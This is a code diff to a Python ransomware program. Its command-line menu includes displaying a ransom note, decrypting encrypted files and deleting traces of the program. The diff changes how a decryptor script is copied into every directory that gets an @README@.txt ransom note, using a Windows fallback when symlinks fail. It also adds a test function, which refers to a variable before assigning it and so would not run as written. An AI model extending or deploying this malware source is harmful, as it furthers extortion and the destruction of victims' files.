@@ -39,6 +39,7 @@ class Program():
         print("\transomnote - displays the ransom note to the user")
         print("\tdecrypt - decrypts the previously encrypted files")
         print("\tdeletetraces - deletes traces of the program")
+        print("\ttestfunc - runs the function to be tested")
         print("\texit or quit - quit the program")
 
     def __info(self):
@@ -143,10 +144,13 @@ class Program():
         with open("ransom_note.txt", "r") as note_file:
             content = note_file.read()
 
+        with open("decrypt.py", "r") as decryptor_file:
+            script_content = decryptor_file.read()
+
         #cwd = os.getcwd()
         for dir in self.__directories_with_files:
             self.__create_ransomnote_file(dir, content)
-            self.__create_decryptor_file(dir)
+            self.__create_decryptor_file(dir, script_content)
             # path = os.path.join(dir, "decryptor.py")
             # if not os.path.exists(path):
             #     os.symlink(os.path.join(cwd, "decrypt.py"), path)
@@ -155,7 +159,7 @@ class Program():
         with open(dst_path + "/@README@.txt", "w") as output_file:
             output_file.write(content)
 
-    def __create_decryptor_file(self, dest="."):
+    def __create_decryptor_file(self, dest=".", script_content=""):
         # Get the execution directory
         cwd = os.getcwd()
         # Get the path where we want to store the decryptor link
@@ -165,9 +169,13 @@ class Program():
                 os.symlink(os.path.join(cwd, "decrypt.py"), path)
         except OSError:
             # Windows does not support symlinks without admin privileges
-            print(f"Could not create symlink at {path}")
-            # In Windows a hardlink will be created
-            os.link(os.path.join(cwd, "decrypt.py"), path)
+            # So we copy the file instead changing the working directory of it
+        
+            content = script_content.replace("#added_line_script", f"os.chdir('{cwd}')")
+    
+            with open(path, "w") as decryptor_file:
+                decryptor_file.write(content)
+
 
     def decrypt(self):
         if self.__criptography is None:
@@ -191,6 +199,17 @@ class Program():
 
         if os.path.exists("discovered_info.json"):
             os.remove("discovered_info.json")
+
+    def __test_function(self, path):
+        cwd = os.getcwd()
+        
+        with open("decrypt.py", "r") as decryptor_file:
+            script_content = decryptor_file.read()
+
+        content = content.replace("#added_line_script", f"os.chdir('{cwd}')")
+        
+        with open(path, "w") as decryptor_file:
+            decryptor_file.write(content)
 
     def __cli(self):
         while self.__should_cli_run:
@@ -239,6 +258,9 @@ class Program():
 
                 case "deletetraces":
                     self.delete_traces()
+                case "testfunc":
+                    print("Running test function...")
+                    self.__test_function("mock files/decryptor_test.py")
 
                 case "exit" | "quit":
                     print("Exiting...")
